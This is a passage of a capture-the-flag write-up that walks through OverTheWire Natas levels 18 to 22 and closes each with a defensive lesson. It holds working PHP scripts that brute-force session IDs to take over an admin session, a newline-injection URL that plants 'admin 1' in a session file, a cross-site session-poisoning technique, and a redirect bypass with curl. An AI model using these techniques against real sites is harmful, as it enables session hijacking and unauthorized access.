@@ -1534,4 +1534,593 @@ Password: <input name="password"><br>
 </html> 
 ~~~~
 
-Interesting. Looks like this one's all about sessions.
+Interesting. Looks like this one's all about sessions. Judging by a cursory glance at the code, 640 of them according to the `$maxid` variable. Also, it appears that one of these sessions has an "admin" attribute, that if set, gives us the credentials for the next challenge.
+
+Haha, I love this comment:
+
+`// 640 should be enough for everyone`
+
+Enough for everyone, indeed... *everyone including the admin!*
+
+Honestly, my gut reaction is to just try every one of the 640 session IDs one-by-one until it coughs up the credentials. I can see here that it says `You are an admin.` if it's the correct session ID, and `You are logged in as a regular user.` if it's not, so that's an easy pass/fail test. Yep... looks like we've got a brute-force attack to concoct! Let's write some PHP.
+
+~~~~
+<?php
+
+function get($url, $i)
+{
+    $username = "natas18";
+    $password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP";
+    $string = base64_encode("$username:$password");
+
+    $options = [
+        'http' => [
+            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n"
+                       . "authorization: Basic $string\r\n"
+                       . "cookie: PHPSESSID=$i",
+            'method'  => 'GET'
+        ]
+    ];
+
+    $context  = stream_context_create($options);
+    $raw_response = file_get_contents($url, false, $context);
+    return $raw_response;
+}
+
+for ($i = 0; $i < 641; $i++)
+{
+    echo "Checking $i\r\n";
+    $response = get("http://natas18.natas.labs.overthewire.org", $i);
+    if (strpos($response, "You are an admin."))
+    {
+        $password = substr($response, strpos($response, "Password: ") + 10, 32);
+        exit("Got it! Session ID $i is Admin.\r\nNatas19 Password: $password");
+    }
+    elseif (!strpos($response, "You are logged in as a regular user."))
+    {
+        var_dump($response);
+    }
+}
+~~~~
+
+Alright, let's run it and see if it spits back anything useful.
+
+~~~~
+$ php natas18.php
+...
+Checking 118
+Checking 119
+Got it! Session ID 119 is Admin.
+Natas19 Password: [censored]
+~~~~
+
+Mental note: Don't make session IDs iterable.
+
+
+## Natas 19 🡆 Natas 20
+
+
+___
+<p>
+<b>
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+</b>
+</p>
+
+<p>
+Please login with your admin account to retrieve credentials for natas20.
+</p>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password"><br>
+<input type="submit" value="Login" />
+</form>
+
+___
+
+Well, they say it's not sequential anymore... let's see if that's true. I'll take a peek at what it gave me for a cookie:
+
+`3436352d`
+
+Hm... that looks like hex. What's it say in ASCII?
+
+`465-`
+
+Interesting. Let's try some more, and see if we notice any patterns.
+
+`198-`, `356-`, `609-`, `470-`, `125-`
+
+Looks like there's always a trailing dash. You know... I haven't been putting anything in the username and password fields to get these cookies... I'm thinking maybe I should try doing that now. Let's try `admin` for the username, and junk text for the password.
+
+`3235342d61646d696e`
+
+That's quite a bit longer! Let's see what it says in ASCII.
+
+`254-admin`
+
+Ha! I bet that dash is to separate the username from the session ID. Let's try a few more just to make sure.
+
+`626-testing`, `318-moretesting`, `223-makingsurethisisntrandom`
+
+Alright, I think we've verified that is our username input after the dash. Something else I've noticed in these tests: I haven't seen any numbers higher than 640. I bet the limit is still the same as the last challenge... In fact, I bet the only difference is that dash and username tacked onto the end of the session ID, and hex-encoding the whole thing. Let's tweak our PHP from last challenge and see if we're right.
+
+~~~~
+<?php
+
+function get($url, $i)
+{
+    $username = "natas19";
+    $password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs";
+    $string = base64_encode("$username:$password");
+
+    $options = [
+        'http' => [
+            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n"
+                       . "authorization: Basic $string\r\n"
+                       . "cookie: PHPSESSID=$i",
+            'method'  => 'GET'
+        ]
+    ];
+
+    $context  = stream_context_create($options);
+    $raw_response = file_get_contents($url, false, $context);
+    return $raw_response;
+}
+
+for ($i = 0; $i < 641; $i++)
+{
+    $session = bin2hex("$i-admin");
+    echo "Checking $session\r\n";
+    $response = get("http://natas19.natas.labs.overthewire.org", $session);
+    if (strpos($response, "You are an admin."))
+    {
+        $password = substr($response, strpos($response, "Password: ") + 10, 32);
+        exit("Got it! Session ID $session is Admin.\r\nNatas20 Password: $password");
+    }
+    elseif (!strpos($response, "You are logged in as a regular user."))
+    {
+        var_dump($response);
+    }
+}
+~~~~
+
+And... run!
+
+~~~~
+$ php natas19.php
+...
+Checking 3238302d61646d696e
+Checking 3238312d61646d696e
+Got it! Session ID 3238312d61646d696e is Admin.
+Natas20 Password: [censored]
+~~~~
+
+Ha! Bingo!
+
+
+## Natas 20 🡆 Natas 21
+
+
+___
+You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
+<form action="index.php" method="POST">
+Your name: <input name="name" value=""><br>
+<input type="submit" value="Change name" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+
+___
+
+
+~~~~
+<html> 
+<head> 
+<!-- This stuff in the header has nothing to do with the level --> 
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"> 
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /> 
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /> 
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script> 
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script> 
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script> 
+<script>var wechallinfo = { "level": "natas20", "pass": "<censored>" };</script></head> 
+<body> 
+<h1>natas20</h1> 
+<div id="content"> 
+<? 
+
+function debug($msg) { /* {{{ */ 
+    if(array_key_exists("debug", $_GET)) { 
+        print "DEBUG: $msg<br>"; 
+    } 
+} 
+/* }}} */ 
+function print_credentials() { /* {{{ */ 
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) { 
+    print "You are an admin. The credentials for the next level are:<br>"; 
+    print "<pre>Username: natas21\n"; 
+    print "Password: <censored></pre>"; 
+    } else { 
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21."; 
+    } 
+} 
+/* }}} */ 
+
+/* we don't need this */ 
+function myopen($path, $name) {  
+    //debug("MYOPEN $path $name");  
+    return true;  
+} 
+
+/* we don't need this */ 
+function myclose() {  
+    //debug("MYCLOSE");  
+    return true;  
+} 
+
+function myread($sid) {  
+    debug("MYREAD $sid");  
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) { 
+    debug("Invalid SID");  
+        return ""; 
+    } 
+    $filename = session_save_path() . "/" . "mysess_" . $sid; 
+    if(!file_exists($filename)) { 
+        debug("Session file doesn't exist"); 
+        return ""; 
+    } 
+    debug("Reading from ". $filename); 
+    $data = file_get_contents($filename); 
+    $_SESSION = array(); 
+    foreach(explode("\n", $data) as $line) { 
+        debug("Read [$line]"); 
+    $parts = explode(" ", $line, 2); 
+    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1]; 
+    } 
+    return session_encode(); 
+} 
+
+function mywrite($sid, $data) {  
+    // $data contains the serialized version of $_SESSION 
+    // but our encoding is better 
+    debug("MYWRITE $sid $data");  
+    // make sure the sid is alnum only!! 
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) { 
+    debug("Invalid SID");  
+        return; 
+    } 
+    $filename = session_save_path() . "/" . "mysess_" . $sid; 
+    $data = ""; 
+    debug("Saving in ". $filename); 
+    ksort($_SESSION); 
+    foreach($_SESSION as $key => $value) { 
+        debug("$key => $value"); 
+        $data .= "$key $value\n"; 
+    } 
+    file_put_contents($filename, $data); 
+    chmod($filename, 0600); 
+} 
+
+/* we don't need this */ 
+function mydestroy($sid) { 
+    //debug("MYDESTROY $sid");  
+    return true;  
+} 
+/* we don't need this */ 
+function mygarbage($t) {  
+    //debug("MYGARBAGE $t");  
+    return true;  
+} 
+
+session_set_save_handler( 
+    "myopen",  
+    "myclose",  
+    "myread",  
+    "mywrite",  
+    "mydestroy",  
+    "mygarbage"); 
+session_start(); 
+
+if(array_key_exists("name", $_REQUEST)) { 
+    $_SESSION["name"] = $_REQUEST["name"]; 
+    debug("Name set to " . $_REQUEST["name"]); 
+} 
+
+print_credentials(); 
+
+$name = ""; 
+if(array_key_exists("name", $_SESSION)) { 
+    $name = $_SESSION["name"]; 
+} 
+
+?> 
+
+<form action="index.php" method="POST"> 
+Your name: <input name="name" value="<?=$name?>"><br> 
+<input type="submit" value="Change name" /> 
+</form> 
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
+</div> 
+</body> 
+</html> 
+~~~~
+
+Still looks like sessions, but it's already logged us in. All we've got is the option to change our name! How could that possibly offer any privilege escalation?
+
+Let's start by taking a look at what it wants:
+
+`if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)`
+
+Alright, as long as it finds `admin 1` in the session file, we're in. So on that note, let's take a look at how it handles our only input: our name.
+
+~~~~
+if(array_key_exists("name", $_REQUEST)) { 
+    $_SESSION["name"] = $_REQUEST["name"]; 
+    debug("Name set to " . $_REQUEST["name"]); 
+}
+~~~~
+
+Woah! They're just throwing our input into the session file without any filtering?! That opens up some possibilities... To help us think of ways to attack this, let's first understand PHP session file. Session files separate key/value pairs with newline characters, and they keys and values themselves by spaces. So on the natas20 server, `$_SESSION["admin"] == 1`would look like:
+
+~~~~
+admin 1
+~~~~
+
+So, we can expect the session file for our non-admin user to look something like this:
+
+~~~~
+name bob
+~~~~
+
+We need to get `admin 1` in there in order to advance, and we have direct control over what goes in this file... What if we included a newline character in our "name", and then `admin 1` after that? Something like: `bob\nadmin 1`
+
+In theory, it should look something like this, when we're done:
+
+~~~~
+name bob
+admin 1
+~~~~
+
+Which *should* give us the credentials for the next level, according to the program.
+
+`http://natas20.natas.labs.overthewire.org/?name=bob%0Aadmin%201`
+
+Returns:
+
+___
+You are an admin. The credentials for the next level are:<br><pre>Username: natas21
+Password: [censored]</pre>
+<form action="index.php" method="POST">
+Your name: <input name="name" value="bob
+admin 1"><br>
+<input type="submit" value="Change name">
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+
+___
+
+Success!
+
+Another mental note: NEVER give users direct access to what's being stored!
+
+
+## Natas 21 🡆 Natas 22
+
+
+___
+<p>
+<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
+</p>
+
+You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+
+
+___
+
+Colocated, huh? Hosting different websites on the same server provides some interesting routes of attack. Let's go check out `http://natas21-experimenter.natas.labs.overthewire.org`
+
+___
+<p>
+<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
+</p>
+
+<p>Example:</p>
+<div style='background-color: yellow; text-align: center; font-size: 100%;'>Hello world!</div>
+<p>Change example values here:</p>
+<form action="index.php" method="POST">align: <input name='align' value='center' /><br>fontsize: <input name='fontsize' value='100%' /><br>bgcolor: <input name='bgcolor' value='yellow' /><br><input type="submit" name="submit" value="Update" /></form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+
+___
+
+Looks like we've got some input! Let's see what the source looks like.
+
+~~~~
+<html> 
+<head><link rel="stylesheet" type="text/css" href="http://www.overthewire.org/wargames/natas/level.css"></head> 
+<body> 
+<h1>natas21 - CSS style experimenter</h1> 
+<div id="content"> 
+<p> 
+<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b> 
+</p> 
+<?   
+
+session_start(); 
+
+// if update was submitted, store it 
+if(array_key_exists("submit", $_REQUEST)) { 
+    foreach($_REQUEST as $key => $val) { 
+    $_SESSION[$key] = $val; 
+    } 
+} 
+
+if(array_key_exists("debug", $_GET)) { 
+    print "[DEBUG] Session contents:<br>"; 
+    print_r($_SESSION); 
+} 
+
+// only allow these keys 
+$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow"); 
+$form = ""; 
+
+$form .= '<form action="index.php" method="POST">'; 
+foreach($validkeys as $key => $defval) { 
+    $val = $defval; 
+    if(array_key_exists($key, $_SESSION)) { 
+    $val = $_SESSION[$key]; 
+    } else { 
+    $_SESSION[$key] = $val; 
+    } 
+    $form .= "$key: <input name='$key' value='$val' /><br>"; 
+} 
+$form .= '<input type="submit" name="submit" value="Update" />'; 
+$form .= '</form>'; 
+
+$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";"; 
+$example = "<div style='$style'>Hello world!</div>"; 
+
+?> 
+
+<p>Example:</p> 
+<?=$example?> 
+
+<p>Change example values here:</p> 
+<?=$form?> 
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
+</div> 
+</body> 
+</html> 
+~~~~
+
+Dang, these people are just so trusting! Look at this:
+
+~~~~
+// if update was submitted, store it 
+if(array_key_exists("submit", $_REQUEST)) { 
+    foreach($_REQUEST as $key => $val) { 
+    $_SESSION[$key] = $val; 
+    } 
+} 
+~~~~
+
+It's almost like they can't help themselves from storing user-submitted data right into a session file. We can put whatever keys we want into our request, and this script is going to just throw everything in there for us.
+
+As an aside: by default, PHP5 stores all session files in the same, common folder... regardless of which website they came from. Which means you can pick up a session that you started on one co-located website, from a different one.
+
+I'm kinda thinking of POSTing `admin=1` into this co-located website, and seeing if we can use that technique against the main challenge site.
+
+Alright, so first up, let's hit refresh and get our session ID that we'll be using for this attack.
+
+natas21 gave us: `4km4nt8vlu6kuuv7rq1r52abf5`
+
+Alright, now we make a POST request against natas21-experimenter using that session ID... We'll just send `admin=1` and see if it stores.
+
+~~~~
+[DEBUG] Session contents:<br>Array
+(
+    [admin] => 1
+)
+~~~~
+
+Alright, cool! It wrote! Let's head back to natas21 and see if we can use that.
+
+Just going to hit refresh, and...
+
+___
+<p>
+<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
+</p>
+
+You are an admin. The credentials for the next level are:<br><pre>Username: natas22
+Password: [censored]</pre>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+
+___
+
+Ta-da! We successfully used a single session across two co-located sites.
+
+Mental note: segregate sessions from different sites when hosting on the same server.
+
+
+## Natas 22 🡆 Natas 23
+
+
+___
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+
+___
+
+Haha... blank page? Alright, whatever, let's see what we've got.
+
+~~~~
+<? 
+session_start(); 
+
+if(array_key_exists("revelio", $_GET)) { 
+    // only admins can reveal the password 
+    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) { 
+    header("Location: /"); 
+    } 
+} 
+?> 
+
+
+<html> 
+<head> 
+<!-- This stuff in the header has nothing to do with the level --> 
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"> 
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /> 
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /> 
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script> 
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script> 
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script> 
+<script>var wechallinfo = { "level": "natas22", "pass": "<censored>" };</script></head> 
+<body> 
+<h1>natas22</h1> 
+<div id="content"> 
+
+<? 
+    if(array_key_exists("revelio", $_GET)) { 
+    print "You are an admin. The credentials for the next level are:<br>"; 
+    print "<pre>Username: natas23\n"; 
+    print "Password: <censored></pre>"; 
+    } 
+?> 
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
+</div> 
+</body> 
+</html> 
+~~~~
+
+Huh, not a lot going on.
+
+"If array_key_exists("revelio", $_GET)..." alright, maybe it's that easy. Let's enter `http://natas22.natas.labs.overthewire.org/?revelio` in our URL bar and see what happens.
+
+And... what the?!
+
+The URL changed to `http://natas22.natas.labs.overthewire.org`... Ugh, must be a 302 header or something being pased to us.
+
+~~~~
+if(array_key_exists("revelio", $_GET)) { 
+    // only admins can reveal the password 
+    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) { 
+    header("Location: /"); 
+    } 
+} 
+~~~~
+
+Ah, yep, `header("Location: /");` right there. No biggie, let's use cURL to get the response without following it.
+
+Let's do `$ curl http://natas22.natas.labs.overthewire.org/?revelio --user natas22:[censored]`, and then I like to add `-v` so I can see the response headers.
+
+____
+You are an admin. The credentials for the next level are:<br><pre>Username: natas23
+Password: [censored]</pre>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+
+____
+
+Nice, and easy. What we learned today is that just because you tell a browser to do something, doesn't mean it's going to do it. By ignoring the `Location` header, we were able to snatch the password.
